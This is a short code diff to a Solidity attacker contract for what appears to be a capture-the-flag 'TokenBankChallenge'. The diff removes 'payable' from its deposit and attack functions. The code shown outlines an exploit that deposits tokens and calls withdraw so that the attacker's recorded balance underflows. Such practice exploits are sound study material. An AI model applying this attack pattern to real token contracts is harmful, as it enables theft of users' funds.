@@ -27,13 +27,13 @@ contract TokenBankAttacker {
         challenge = ITokenBankChallenge(challengeAddress);
     }
 
-    function deposit() external payable {
+    function deposit() external {
         uint256 myBalance = challenge.token().balanceOf(address(this));
         // deposit is handled in challenge's tokenFallback
         challenge.token().transfer(address(challenge), myBalance);
     }
 
-    function attack() external payable {
+    function attack() external {
         callWithdraw();
 
         console.log("attacker balance underflows : ", challenge.balanceOf(address(this)));
